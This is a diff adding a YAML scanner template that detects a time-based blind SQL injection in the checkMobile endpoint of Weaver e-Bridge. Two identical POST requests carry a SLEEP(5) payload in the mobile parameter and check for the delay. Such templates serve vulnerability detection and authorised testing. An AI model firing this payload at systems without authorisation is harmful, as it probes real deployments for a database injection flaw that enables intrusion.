@@ -1,0 +1,21 @@
+name: 泛微云桥e-Bridge-checkMobile-SQL注入
+description: >
+  SQL延时注入
+alwaysExecute: false
+timeout: 8
+matchCount: 2
+rules:   
+  - method: POST
+    path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    expression:
+      status: 200
+      sleep: 5
+  - method: POST
+    path: /taste/checkMobile?company=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3E3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX&openid=1&source=1&userName=1
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    expression:
+      status: 200
+      sleep: 5
